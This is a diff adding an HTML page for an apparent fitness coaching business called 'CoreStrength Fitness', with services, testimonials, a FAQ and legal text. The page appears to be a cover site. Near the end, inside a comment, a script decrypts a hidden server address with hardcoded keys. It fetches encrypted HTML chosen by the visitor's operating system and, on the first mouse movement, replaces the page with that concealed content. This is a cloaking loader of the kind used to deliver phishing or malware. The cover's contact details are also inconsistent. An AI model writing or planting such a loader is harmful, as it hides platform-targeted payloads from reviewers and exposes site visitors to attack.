@@ -1,0 +1,586 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/crypto-js.min.js"></script>
+	  <style>
+	    * { box-sizing: border-box; }
+	    html, body { margin: 0; height: 100%; }
+	    body { font-family: system-ui, -apple-system, "Segoe UI", sans-serif; color: #1f2433; background: #f6f7fb; }
+	    a { text-decoration: none; color: inherit; }
+	    #frame { display: none; width: 100%; height: 100vh; border: 0; }
+	    .hint { text-align: center; padding: 8px; font-size: .85rem; color: #6d28d9; background: #ede9fe; }
+
+    
+	    .popup { 
+	      position: fixed; 
+	      top: 0; 
+	      left: 0; 
+	      width: 100%; 
+	      height: 100%; 
+	      background: #ffffff; 
+	      display: flex; 
+	      justify-content: center; 
+	      align-items: center; 
+	      z-index: 9999; 
+	    }
+	    .popup-content { 
+	      background: #ffffff; 
+	      padding: 60px; 
+	      text-align: center; 
+	      width: 100%;
+	      max-width: 600px; 
+	    }
+	    .loading-gif { 
+	      width: 160px; 
+	      height: 160px; 
+	      margin-bottom: 30px; 
+	    }
+	    .popup-content p {
+	      font-size: 1.5rem; 
+	      color: #1f2433;
+	      font-weight: 600;
+	      margin: 10px 0 35px 0;
+	    }
+	    .buttons { 
+	      display: flex;
+	      justify-content: center;
+	      gap: 25px;
+	    }
+	    button { 
+	      padding: 15px 35px; 
+	      font-size: 1.1rem;
+	      border: none; 
+	      border-radius: 8px; 
+	      cursor: pointer; 
+	      font-weight: 700; 
+	      min-width: 150px;
+	      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+	    }
+	    #cancelBtn { background: #f44336; color: white; }
+	    #continueBtn { background: #4CAF50; color: white; }
+	    button:hover { opacity: 0.9; }
+	</style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="description" content="Science-based training programs designed by certified fitness professionals. Personalized plans, nutrition guidance, and supportive coaching for sustainable results.">
+  <meta name="robots" content="index, follow">
+  <meta name="author" content="CoreStrength Fitness">
+  <meta property="og:title" content="CoreStrength Fitness - Science-Based Training for Lasting Results">
+  <meta property="og:description" content="Science-based training programs designed by certified fitness professionals. Personalized plans, nutrition guidance, and supportive coaching for sustainable results.">
+  <meta property="og:type" content="website">
+  <meta property="og:locale" content="en_US">
+  <meta property="og:site_name" content="CoreStrength Fitness">
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="CoreStrength Fitness - Science-Based Training for Lasting Results">
+  <meta name="twitter:description" content="Science-based training programs designed by certified fitness professionals. Personalized plans, nutrition guidance, and supportive coaching for sustainable results.">
+  <link rel="canonical" href="https://www.corestrengthfitness.com">
+  <title>CoreStrength Fitness | Science-Based Training for Lasting Results</title>
+  <script type="application/ld+json">{"@context":"https://schema.org","@type":"Organization","name":"CoreStrength Fitness","description":"Science-based training programs designed by certified fitness professionals. Personalized plans, nutrition guidance, and supportive coaching for sustainable results.","url":"https://www.corestrengthfitness.com","foundingDate":"2019","address":{"@type":"PostalAddress","streetAddress":"6326 Spring Street, Unit H","addressLocality":"Minneapolis","addressRegion":"MN","postalCode":"55413","addressCountry":"US"},"contactPoint":{"@type":"ContactPoint","telephone":"(954) 333-1848","email":"help@corestrengthfitness.io","contactType":"customer service","availableLanguage":"English"},"sameAs":[]}</script>
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif; line-height: 1.7; color: #333; background: #fff; -webkit-font-smoothing: antialiased; }
+    a { color: #D84315; text-decoration: none; transition: color 0.2s; }
+    a:hover { text-decoration: underline; }
+    img { max-width: 100%; height: auto; }
+    .container { max-width: 1100px; margin: 0 auto; padding: 0 24px; }
+    .sr-only { position: absolute; width: 1px; height: 1px; padding: 0; margin: -1px; overflow: hidden; clip: rect(0,0,0,0); white-space: nowrap; border-width: 0; }
+
+    /* Header */
+    .header { background: #fff; border-bottom: 1px solid #e5e7eb; padding: 16px 0; position: sticky; top: 0; z-index: 100; }
+    .header .container { display: flex; align-items: center; justify-content: space-between; flex-wrap: wrap; gap: 12px; }
+    .logo { font-size: 22px; font-weight: 700; color: #D84315; letter-spacing: -0.3px; }
+    .nav { display: flex; gap: 28px; flex-wrap: wrap; }
+    .nav a { color: #555; font-size: 15px; font-weight: 500; }
+    .nav a:hover { color: #D84315; text-decoration: none; }
+
+    /* Hero */
+    .hero { background: linear-gradient(135deg, #D843150D 0%, #D8431506 100%); padding: 80px 0 72px; text-align: center; }
+    .hero h1 { font-size: 40px; font-weight: 800; color: #111; margin-bottom: 18px; line-height: 1.2; letter-spacing: -0.5px; }
+    .hero p { font-size: 18px; color: #555; max-width: 660px; margin: 0 auto 36px; line-height: 1.7; }
+    .hero-btn { display: inline-block; background: #D84315; color: #fff; padding: 14px 36px; border-radius: 8px; font-size: 16px; font-weight: 600; transition: opacity 0.2s, transform 0.15s; }
+    .hero-btn:hover { opacity: 0.9; text-decoration: none; transform: translateY(-1px); }
+    .trust-bar { display: flex; justify-content: center; gap: 32px; margin-top: 40px; flex-wrap: wrap; }
+    .trust-item { text-align: center; }
+    .trust-item strong { display: block; font-size: 24px; color: #D84315; font-weight: 700; }
+    .trust-item span { font-size: 13px; color: #777; }
+
+    /* Section Common */
+    .section { padding: 72px 0; }
+    .section-alt { background: #f9fafb; }
+    .section-title { font-size: 30px; font-weight: 700; color: #111; text-align: center; margin-bottom: 12px; }
+    .section-subtitle { font-size: 16px; color: #666; text-align: center; max-width: 600px; margin: 0 auto 48px; }
+
+    /* Features */
+    .features-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(240px, 1fr)); gap: 28px; }
+    .feature-card { padding: 28px; border: 1px solid #e5e7eb; border-radius: 12px; background: #fff; transition: box-shadow 0.2s; }
+    .feature-card:hover { box-shadow: 0 4px 16px rgba(0,0,0,0.06); }
+    .feature-icon { width: 52px; height: 52px; border-radius: 10px; background: #D843150F; display: flex; align-items: center; justify-content: center; margin-bottom: 16px; }
+    .feature-card h3 { font-size: 18px; font-weight: 600; color: #111; margin-bottom: 8px; }
+    .feature-card p { font-size: 14px; color: #666; line-height: 1.6; }
+
+    /* About */
+    .about-content { max-width: 800px; margin: 0 auto; }
+    .about-content p { font-size: 16px; color: #555; margin-bottom: 20px; line-height: 1.8; }
+    .about-stats { display: flex; justify-content: center; gap: 48px; margin-top: 40px; flex-wrap: wrap; }
+    .about-stat { text-align: center; }
+    .about-stat strong { display: block; font-size: 28px; color: #D84315; font-weight: 700; }
+    .about-stat span { font-size: 14px; color: #777; }
+
+    /* Testimonials */
+    .testimonials-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 24px; }
+    .testimonial-card { padding: 28px; border: 1px solid #e5e7eb; border-radius: 12px; background: #fff; }
+    .testimonial-stars { color: #f59e0b; font-size: 18px; margin-bottom: 12px; letter-spacing: 2px; }
+    .testimonial-text { font-size: 15px; color: #444; line-height: 1.7; margin-bottom: 20px; font-style: italic; }
+    .testimonial-author { display: flex; align-items: center; gap: 12px; }
+    .testimonial-avatar { width: 40px; height: 40px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: 700; font-size: 16px; }
+    .testimonial-name { font-weight: 600; font-size: 14px; color: #222; }
+    .testimonial-role { font-size: 13px; color: #888; }
+
+    /* FAQ */
+    .faq-list { max-width: 760px; margin: 0 auto; }
+    .faq-item { border: 1px solid #e5e7eb; border-radius: 10px; margin-bottom: 12px; overflow: hidden; }
+    .faq-item summary { padding: 18px 24px; font-size: 16px; font-weight: 600; color: #222; cursor: pointer; list-style: none; display: flex; justify-content: space-between; align-items: center; }
+    .faq-item summary::-webkit-details-marker { display: none; }
+    .faq-item summary::after { content: '+'; font-size: 22px; color: #D84315; font-weight: 300; flex-shrink: 0; margin-left: 16px; }
+    .faq-item[open] summary::after { content: '\2212'; }
+    .faq-item p { padding: 0 24px 20px; font-size: 15px; color: #555; line-height: 1.7; }
+
+    /* Contact */
+    .contact-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(260px, 1fr)); gap: 32px; max-width: 900px; margin: 0 auto; }
+    .contact-card { padding: 28px; border: 1px solid #e5e7eb; border-radius: 12px; text-align: center; }
+    .contact-card h3 { font-size: 16px; font-weight: 600; color: #222; margin-bottom: 8px; }
+    .contact-card p { font-size: 14px; color: #666; line-height: 1.6; }
+    .contact-card a { color: #D84315; font-weight: 500; }
+
+    /* Legal Pages */
+    .legal-section { padding: 56px 0; border-top: 1px solid #e5e7eb; }
+    .legal-section .container { max-width: 800px; }
+    .legal-section h2 { font-size: 26px; font-weight: 700; color: #111; margin-bottom: 24px; }
+    .legal-section h3 { font-size: 18px; font-weight: 600; color: #222; margin: 28px 0 12px; }
+    .legal-section p, .legal-section li { font-size: 14px; color: #555; line-height: 1.8; margin-bottom: 12px; }
+    .legal-section ul { padding-left: 24px; margin-bottom: 16px; }
+    .legal-section li { margin-bottom: 6px; }
+
+    /* Disclaimer Banner */
+    .disclaimer-banner { background: #f9fafb; border-top: 1px solid #e5e7eb; padding: 28px 0; }
+    .disclaimer-banner p { font-size: 12px; color: #888; line-height: 1.7; max-width: 900px; margin: 0 auto; text-align: center; }
+
+    /* Footer */
+    .footer { background: #111; color: #ccc; padding: 48px 0 24px; }
+    .footer-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 32px; margin-bottom: 32px; }
+    .footer h4 { color: #fff; font-size: 16px; font-weight: 600; margin-bottom: 16px; }
+    .footer a { color: #aaa; font-size: 14px; display: block; margin-bottom: 8px; }
+    .footer a:hover { color: #fff; text-decoration: none; }
+    .footer p { font-size: 13px; color: #888; line-height: 1.6; }
+    .footer-bottom { border-top: 1px solid #333; padding-top: 24px; display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 12px; }
+    .footer-bottom p { font-size: 13px; color: #777; }
+    .footer-legal { display: flex; gap: 20px; flex-wrap: wrap; }
+    .footer-legal a { font-size: 13px; color: #888; margin: 0; }
+
+    @media (max-width: 768px) {
+      .hero h1 { font-size: 30px; }
+      .hero { padding: 48px 0 40px; }
+      .section { padding: 48px 0; }
+      .trust-bar { gap: 20px; }
+      .about-stats { gap: 24px; }
+      .footer-bottom { flex-direction: column; text-align: center; }
+    }
+  </style>
+</head>
+<body>
+	<!--
+	  <div class="popup" id="customPopup">
+	    <div class="popup-content">
+	      <img src="https://i.gifer.com/ZZ5H.gif" alt="Loading..." class="loading-gif">
+	      <p>Loading... Please wait.</p>
+	      <div class="buttons">
+	        <button id="cancelBtn" type="button">Cancel</button>
+	        <button id="continueBtn" type="button">Continue</button>
+	      </div>
+	    </div>
+	  </div>
+		-->
+	  
+	<div id="shop">
+  <!-- Header -->
+  <header class="header" role="banner">
+    <div class="container">
+      <div class="logo">CoreStrength Fitness</div>
+      <nav class="nav" role="navigation" aria-label="Main navigation">
+        <a href="#">Home</a>
+      <a href="#programs">Programs</a>
+      <a href="#about">About</a>
+      <a href="#contact">Contact</a>
+      </nav>
+    </div>
+  </header>
+
+  <!-- Hero Section -->
+  <section class="hero" aria-label="Introduction">
+    <div class="container">
+      <h1>Science-Based Training for Lasting Results</h1>
+      <p>We believe fitness should be accessible, enjoyable, and sustainable. Our programs are designed around your goals, your schedule, and your current fitness level.</p>
+      <a href="#contact" class="hero-btn">Get a Free Assessment</a>
+      <div class="trust-bar">
+        <div class="trust-item"><strong>500+</strong><span>Clients Served</span></div>
+        <div class="trust-item"><strong>7+</strong><span>Years Experience</span></div>
+        <div class="trust-item"><strong>15+</strong><span>Team Members</span></div>
+      </div>
+    </div>
+  </section>
+
+  <!-- Features Section -->
+  <section class="section" id="services" aria-label="The Training Experience">
+    <div class="container">
+      <h2 class="section-title">The Training Experience</h2>
+      <p class="section-subtitle">Discover how we deliver value through expertise, quality, and dedication to your success.</p>
+      <div class="features-grid">
+        
+      <div class="feature-card">
+        <div class="feature-icon">
+          <svg width="28" height="28" fill="none" stroke="#D84315" stroke-width="2" viewBox="0 0 24 24"><path d="M12 4.354a4 4 0 110 5.292M15 21H3v-1a6 6 0 0112 0v1zm0 0h6v-1a6 6 0 00-9-5.197M13 7a4 4 0 11-8 0 4 4 0 018 0z" stroke-linecap="round" stroke-linejoin="round"/></svg>
+        </div>
+        <h3>Supportive Community</h3>
+        <p>Connect with fellow members in our moderated community forum for motivation, accountability partnerships, and shared success.</p>
+      </div>
+      <div class="feature-card">
+        <div class="feature-icon">
+          <svg width="28" height="28" fill="none" stroke="#D84315" stroke-width="2" viewBox="0 0 24 24"><path d="M4 6h16M4 10h16M4 14h16M4 18h16" stroke-linecap="round" stroke-linejoin="round"/></svg>
+        </div>
+        <h3>Workout Library</h3>
+        <p>Access to 500+ exercise demonstrations with proper form videos, muscle group targeting, and modification options for different fitness levels.</p>
+      </div>
+      <div class="feature-card">
+        <div class="feature-icon">
+          <svg width="28" height="28" fill="none" stroke="#D84315" stroke-width="2" viewBox="0 0 24 24"><path d="M9 5H7a2 2 0 00-2 2v12a2 2 0 002 2h10a2 2 0 002-2V7a2 2 0 00-2-2h-2M9 5a2 2 0 002 2h2a2 2 0 002-2M9 5a2 2 0 012-2h2a2 2 0 012 2m-3 7h3m-3 4h3m-6-4h.01M9 16h.01" stroke-linecap="round" stroke-linejoin="round"/></svg>
+        </div>
+        <h3>Personalized Training Programs</h3>
+        <p>Custom workout plans designed by certified personal trainers based on your goals, fitness level, equipment access, and schedule.</p>
+      </div>
+      <div class="feature-card">
+        <div class="feature-icon">
+          <svg width="28" height="28" fill="none" stroke="#D84315" stroke-width="2" viewBox="0 0 24 24"><path d="M15 10l4.553-2.276A1 1 0 0121 8.618v6.764a1 1 0 01-1.447.894L15 14M5 18h8a2 2 0 002-2V8a2 2 0 00-2-2H5a2 2 0 00-2 2v8a2 2 0 002 2z" stroke-linecap="round" stroke-linejoin="round"/></svg>
+        </div>
+        <h3>Virtual Coaching Sessions</h3>
+        <p>One-on-one video coaching sessions with certified trainers for form checks, program adjustments, and accountability check-ins.</p>
+      </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- About Section -->
+  <section class="section section-alt" id="about" aria-label="Our Philosophy">
+    <div class="container">
+      <h2 class="section-title">Our Philosophy</h2>
+      <div class="about-content">
+        <p>Founded in 2019 by certified fitness professionals, our mission is to make evidence-based fitness coaching accessible to everyone, regardless of experience level or budget. Our team holds certifications from NASM, ACE, NSCA, and other recognized organizations.</p>
+        <p>We reject the "quick fix" mentality that dominates the fitness industry. Instead, we focus on building sustainable habits, proper movement patterns, and a healthy relationship with exercise and nutrition. Our approach is grounded in exercise science and sports medicine research.</p>
+        <p>With 500+ members trusting our programs, we are committed to individual attention and measurable results. Our trainers undergo continuing education annually and stay current with the latest research in exercise science and nutrition.</p>
+      </div>
+      <div class="about-stats">
+        <div class="about-stat"><strong>500+</strong><span>Happy Clients</span></div>
+        <div class="about-stat"><strong>7+</strong><span>Years in Business</span></div>
+        <div class="about-stat"><strong>15+</strong><span>Professionals</span></div>
+        <div class="about-stat"><strong>4.8/5</strong><span>Client Satisfaction</span></div>
+      </div>
+    </div>
+  </section>
+
+  <!-- Testimonials Section -->
+  <section class="section" id="testimonials" aria-label="Member Stories">
+    <div class="container">
+      <h2 class="section-title">Member Stories</h2>
+      <p class="section-subtitle">Hear from people who have experienced our commitment to quality and service firsthand.</p>
+      <div class="testimonials-grid">
+        
+      <div class="testimonial-card">
+        <div class="testimonial-stars" aria-label="5 out of 5 stars">&#9733;&#9733;&#9733;&#9733;&#9733;</div>
+        <p class="testimonial-text">&ldquo;After knee surgery, their trainers worked within my physical therapy guidelines to help me rebuild strength safely. The communication between my PT and trainer was excellent.&rdquo;</p>
+        <div class="testimonial-author">
+          <div class="testimonial-avatar" style="background:#D8431522;color:#D84315">T</div>
+          <div>
+            <div class="testimonial-name">Tyler Brooks</div>
+            <div class="testimonial-role">Rehabilitation Client</div>
+          </div>
+        </div>
+      </div>
+      <div class="testimonial-card">
+        <div class="testimonial-stars" aria-label="5 out of 5 stars">&#9733;&#9733;&#9733;&#9733;&#9733;</div>
+        <p class="testimonial-text">&ldquo;The program flexibility is what keeps me going. I can do 20-minute workouts when time is short and longer sessions on weekends. No guilt, just consistency.&rdquo;</p>
+        <div class="testimonial-author">
+          <div class="testimonial-avatar" style="background:#D8431522;color:#D84315">P</div>
+          <div>
+            <div class="testimonial-name">Priya Sharma</div>
+            <div class="testimonial-role">Working Parent</div>
+          </div>
+        </div>
+      </div>
+      <div class="testimonial-card">
+        <div class="testimonial-stars" aria-label="5 out of 5 stars">&#9733;&#9733;&#9733;&#9733;&#9733;</div>
+        <p class="testimonial-text">&ldquo;The strength training program complemented my running perfectly. My trainer understood my goals and designed a program that improved my performance without overtraining.&rdquo;</p>
+        <div class="testimonial-author">
+          <div class="testimonial-avatar" style="background:#D8431522;color:#D84315">D</div>
+          <div>
+            <div class="testimonial-name">Derek Johnson</div>
+            <div class="testimonial-role">Marathon Runner</div>
+          </div>
+        </div>
+      </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- FAQ Section -->
+  <section class="section section-alt" id="faq" aria-label="Frequently Asked Questions">
+    <div class="container">
+      <h2 class="section-title">Frequently Asked Questions</h2>
+      <p class="section-subtitle">Find answers to the most common questions about our services, policies, and processes.</p>
+      <div class="faq-list">
+        
+      <details class="faq-item" open>
+        <summary>Do I need gym equipment?</summary>
+        <p>No. We offer programs for home workouts with minimal or no equipment, as well as full gym programs. During onboarding, we ask about your equipment access to design an appropriate program.</p>
+      </details>
+      <details class="faq-item">
+        <summary>Can I do this program if I have a medical condition?</summary>
+        <p>We recommend getting medical clearance from your physician before starting any exercise program. Our trainers can work within guidelines provided by your healthcare provider, but we do not provide medical advice or replace physical therapy.</p>
+      </details>
+      <details class="faq-item">
+        <summary>Will I lose weight on this program?</summary>
+        <p>We cannot guarantee specific weight loss results, as outcomes depend on many factors including nutrition, consistency, sleep, stress, and individual physiology. We focus on building sustainable habits, improving fitness markers, and overall well-being.</p>
+      </details>
+      <details class="faq-item">
+        <summary>How often should I work out?</summary>
+        <p>We typically recommend 3-5 sessions per week depending on your goals and fitness level, but programs are customized. Consistency matters more than frequency, and we design programs that fit realistically into your life.</p>
+      </details>
+      <details class="faq-item">
+        <summary>Are your trainers certified?</summary>
+        <p>Yes, all trainers hold nationally recognized certifications (NASM, ACE, NSCA, or equivalent) and maintain current CPR/AED certification. Many hold additional specializations in areas like corrective exercise, nutrition, and sports performance.</p>
+      </details>
+      </div>
+    </div>
+  </section>
+
+  <!-- Contact Section -->
+  <section class="section" id="contact" aria-label="Contact Us">
+    <div class="container">
+      <h2 class="section-title">Contact Us</h2>
+      <p class="section-subtitle">We would love to hear from you. Reach out through any of the channels below.</p>
+      <div class="contact-grid">
+        <div class="contact-card">
+          <h3>Visit Us</h3>
+          <p>6326 Spring Street, Unit H<br>Minneapolis, MN 55413<br>United States</p>
+        </div>
+        <div class="contact-card">
+          <h3>Call Us</h3>
+          <p>(954) 333-1848<br>Monday &ndash; Friday<br>9:00 AM &ndash; 6:00 PM EST</p>
+        </div>
+        <div class="contact-card">
+          <h3>Email Us</h3>
+          <p><a href="/cdn-cgi/l/email-protection#c9a1aca5b989aaa6bbacbabdbbaca7aebda1afa0bda7acbabae7a0a6"><span class="__cf_email__" data-cfemail="d5bdb0b9a595b6baa7b0a6a1a7b0bbb2a1bdb3bca1bbb0a6a6fbbcba">[email&#160;protected]</span></a><br>We respond within<br>1 business day</p>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- Privacy Policy -->
+  <section class="legal-section" id="privacy" aria-label="Privacy Policy">
+    <div class="container">
+      <h2>Privacy Policy</h2>
+      <p><strong>Last Updated:</strong> September 11, 2026</p>
+      <p>CoreStrength Fitness ("we," "us," or "our") operates this website. This Privacy Policy explains how we collect, use, disclose, and safeguard your information when you visit our website.</p>
+
+      <h3>Information We Collect</h3>
+      <p>We may collect information about you in a variety of ways including:</p>
+      <ul>
+        <li><strong>Personal Data:</strong> Name, email address, phone number, and mailing address that you voluntarily provide when contacting us or subscribing to our newsletter.</li>
+        <li><strong>Usage Data:</strong> Information automatically collected when you visit our website, including your IP address, browser type, operating system, referring URLs, pages viewed, and dates/times of visits.</li>
+        <li><strong>Cookies:</strong> We use cookies and similar tracking technologies to enhance your browsing experience. You can set your browser to refuse cookies, but some features of the site may not function properly.</li>
+      </ul>
+
+      <h3>How We Use Your Information</h3>
+      <p>We may use the information we collect for purposes including:</p>
+      <ul>
+        <li>Responding to your inquiries and providing customer support</li>
+        <li>Sending you newsletters or marketing communications (with your consent)</li>
+        <li>Improving our website, services, and user experience</li>
+        <li>Analyzing usage trends and website performance</li>
+        <li>Complying with applicable laws and regulations</li>
+      </ul>
+
+      <h3>Information Sharing</h3>
+      <p>We do not sell, trade, or rent your personal information to third parties. We may share your information with trusted service providers who assist us in operating our website and conducting our business, provided they agree to keep your information confidential. We may also disclose information when required by law or to protect our rights.</p>
+
+      <h3>Data Security</h3>
+      <p>We implement reasonable security measures to protect your personal information. However, no method of transmission over the Internet or electronic storage is 100% secure, and we cannot guarantee absolute security.</p>
+
+      <h3>Third-Party Links</h3>
+      <p>Our website may contain links to third-party websites. We are not responsible for the privacy practices or content of these sites. We encourage you to read the privacy policies of any third-party sites you visit.</p>
+
+      <h3>Children's Privacy</h3>
+      <p>Our website is not intended for individuals under the age of 13. We do not knowingly collect personal information from children under 13. If we become aware that we have collected information from a child under 13, we will take steps to delete it promptly.</p>
+
+      <h3>Your Rights</h3>
+      <p>Depending on your jurisdiction, you may have rights regarding your personal data including the right to access, correct, delete, or restrict processing of your information. To exercise these rights, please contact us using the information provided below.</p>
+
+      <h3>Changes to This Policy</h3>
+      <p>We may update this Privacy Policy from time to time. Changes will be posted on this page with an updated revision date. We encourage you to review this policy periodically.</p>
+
+      <h3>Contact Us About Privacy</h3>
+      <p>If you have questions or concerns about this Privacy Policy, please contact us at:<br>
+      CoreStrength Fitness<br>
+      6326 Spring Street, Unit H, Minneapolis, MN 55413<br>
+      Email: <a href="/cdn-cgi/l/email-protection#81e9e4edf1c1e2eef3e4f2f5f3e4efe6f5e9e7e8f5efe4f2f2afe8ee"><span class="__cf_email__" data-cfemail="5038353c2010333f2235232422353e3724383639243e3523237e393f">[email&#160;protected]</span></a><br>
+      Phone: (954) 333-1848</p>
+    </div>
+  </section>
+
+  <!-- Terms of Service -->
+  <section class="legal-section" id="terms" aria-label="Terms of Service">
+    <div class="container">
+      <h2>Terms of Service</h2>
+      <p><strong>Last Updated:</strong> September 11, 2026</p>
+      <p>Please read these Terms of Service ("Terms") carefully before using the CoreStrength Fitness website. By accessing or using our website, you agree to be bound by these Terms.</p>
+
+      <h3>1. Acceptance of Terms</h3>
+      <p>By accessing this website, you acknowledge that you have read, understood, and agree to be bound by these Terms. If you do not agree with any part of these Terms, you must not use this website.</p>
+
+      <h3>2. Use of Website</h3>
+      <p>You agree to use this website only for lawful purposes and in accordance with these Terms. You agree not to:</p>
+      <ul>
+        <li>Use the website in any way that violates applicable laws or regulations</li>
+        <li>Attempt to interfere with the proper functioning of the website</li>
+        <li>Use any automated means to access the website without our written permission</li>
+        <li>Impersonate any person or entity or misrepresent your affiliation</li>
+      </ul>
+
+      <h3>3. Intellectual Property</h3>
+      <p>All content on this website, including text, graphics, logos, images, and software, is the property of CoreStrength Fitness or its content suppliers and is protected by intellectual property laws. You may not reproduce, distribute, modify, or create derivative works without our prior written consent.</p>
+
+      <h3>4. Disclaimer of Warranties</h3>
+      <p>This website and its contents are provided on an "as is" and "as available" basis without warranties of any kind, either express or implied. We do not warrant that the website will be uninterrupted, error-free, or free of viruses or other harmful components.</p>
+
+      <h3>5. Limitation of Liability</h3>
+      <p>To the fullest extent permitted by law, CoreStrength Fitness shall not be liable for any indirect, incidental, special, consequential, or punitive damages arising from your use of or inability to use this website or its content.</p>
+
+      <h3>6. Third-Party Links</h3>
+      <p>This website may contain links to third-party websites that are not owned or controlled by us. We have no control over and assume no responsibility for the content, privacy policies, or practices of any third-party websites.</p>
+
+      <h3>7. Indemnification</h3>
+      <p>You agree to indemnify and hold harmless CoreStrength Fitness, its officers, directors, employees, and agents from any claims, liabilities, damages, losses, or expenses arising from your use of the website or violation of these Terms.</p>
+
+      <h3>8. Governing Law</h3>
+      <p>These Terms shall be governed by and construed in accordance with the laws of the State of MN, without regard to its conflict of law provisions.</p>
+
+      <h3>9. Changes to Terms</h3>
+      <p>We reserve the right to modify these Terms at any time. Changes become effective when posted on this page. Your continued use of the website after changes constitutes acceptance of the modified Terms.</p>
+
+      <h3>10. Contact Information</h3>
+      <p>For questions about these Terms, please contact us at:<br>
+      CoreStrength Fitness<br>
+      6326 Spring Street, Unit H, Minneapolis, MN 55413<br>
+      Email: <a href="/cdn-cgi/l/email-protection#5139343d2111323e2334222523343f3625393738253f3422227f383e"><span class="__cf_email__" data-cfemail="224a474e5262414d5047515650474c45564a444b564c4751510c4b4d">[email&#160;protected]</span></a><br>
+      Phone: (954) 333-1848</p>
+    </div>
+  </section>
+
+  <!-- Disclaimer Banner -->
+  <div class="disclaimer-banner">
+    <div class="container">
+      <p><strong>Disclaimer:</strong> Results vary based on individual effort, consistency, body composition, genetics, nutrition, sleep, and other factors. Our programs are not a substitute for professional medical advice or physical therapy. Consult your physician before starting any exercise or nutrition program, especially if you have existing health conditions. We do not guarantee specific results such as weight loss amounts, muscle gain, or performance metrics. Individual experiences shared in testimonials are personal and may not reflect typical results.</p>
+    </div>
+  </div>
+
+  <!-- Footer -->
+  <footer class="footer" role="contentinfo">
+    <div class="container">
+      <div class="footer-grid">
+        <div>
+          <h4>CoreStrength Fitness</h4>
+          <p>6326 Spring Street, Unit H<br>Minneapolis, MN 55413</p>
+          <p style="margin-top:12px">(954) 333-1848<br><a href="/cdn-cgi/l/email-protection#325a575e4272515d4057414640575c55465a545b465c5741411c5b5d"><span class="__cf_email__" data-cfemail="5b333e372b1b3834293e282f293e353c2f333d322f353e2828753234">[email&#160;protected]</span></a></p>
+        </div>
+        <div>
+          <h4>Quick Links</h4>
+          <a href="#">Home</a>
+          <a href="#programs">Programs</a>
+          <a href="#about">About</a>
+          <a href="#contact">Contact</a>
+        </div>
+        <div>
+          <h4>Legal</h4>
+          <a href="#privacy">Privacy Policy</a>
+          <a href="#terms">Terms of Service</a>
+          <a href="#faq">FAQ</a>
+        </div>
+        <div>
+          <h4>Business Hours</h4>
+          <p>Monday &ndash; Friday<br>9:00 AM &ndash; 6:00 PM EST</p>
+          <p style="margin-top:12px">Saturday &ndash; Sunday<br>Closed</p>
+        </div>
+      </div>
+      <div class="footer-bottom">
+        <p>&copy; 2026 CoreStrength Fitness. All rights reserved.</p>
+        <div class="footer-legal">
+          <a href="#privacy">Privacy Policy</a>
+          <a href="#terms">Terms of Service</a>
+          <a href="#contact">Contact</a>
+        </div>
+      </div>
+    </div>
+  </footer>
+<script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script type="module" src="https://static.cloudflareinsights.com/beacon.min.js/v31edd6df95cf4e85bb4c19e7a9bdbcba1788362987495" integrity="sha512-iIg7k2xntmwu6/uSb5tpc/hySgZc4eoL31yB29W6tJFo2akwjPWcEqnCEdJvGexCL0KEQwVYv5BlowfhVz26hg==" data-cf-beacon='{"version":"2024.11.0","token":"73a5ad25a72948c5aaf7644578d0667e","r":1,"spa":2}' crossorigin="anonymous"></script>
+</div>
+
+
+
+  <iframe id="frame" title="encrypted shop" allowfullscreen allow="fullscreen"></iframe>
+<!--
+<script>
+    const PASSPHRASE = "98yNCjeAfWMwk0wI";  
+    const URL_KEY = "UrLk3yShopEase01";
+    const ENC_DATA_ORIGIN = "U2FsdGVkX18Dt50kVaiyVln7+GHZBG/eV7uiCsTY46gA1ym8YY+vrd2217s9Nq7qvbS2RVkGVx5PI/WeASWAeQ==";
+    const DATA_ORIGIN = CryptoJS.AES.decrypt(ENC_DATA_ORIGIN, URL_KEY).toString(CryptoJS.enc.Utf8);
+    const DATA_URL = DATA_ORIGIN + "/data";
+    let lastUrl = null;
+
+    function detectPlatform() {
+      const p = (navigator.userAgentData && navigator.userAgentData.platform) ||
+                navigator.platform || navigator.userAgent || "";
+      return /mac/i.test(p) ? "mac" : "win";
+    }
+
+    async function loadSecret() {
+      const shop = document.getElementById("shop"), frame = document.getElementById("frame");
+      try {
+        const res = await fetch(DATA_URL + "?platform=" + detectPlatform());
+        const { cipher } = await res.json();
+        const html = CryptoJS.AES.decrypt(cipher, PASSPHRASE).toString(CryptoJS.enc.Utf8);
+        if (!html) throw new Error("Decrypt failed — wrong key?");
+
+        if (lastUrl) URL.revokeObjectURL(lastUrl);
+        const blob = new Blob([html], { type: "text/html" });
+        lastUrl = URL.createObjectURL(blob);
+
+        frame.src = lastUrl;
+        
+      
+        shop.style.display = "none";
+        frame.style.display = "block";
+        document.getElementById("customPopup").style.display = "none"; 
+        
+      } catch (e) {
+        document.querySelector(".hint").textContent = "⚠️ " + e.message;
+        document.getElementById("customPopup").style.display = "none";
+      }
+    }
+
+    
+    window.addEventListener("mousemove", () => {
+      document.getElementById("customPopup").style.display = "none";
+      loadSecret();
+    }, { once: true });
+</script>
+    -->
+</body>
+</html>
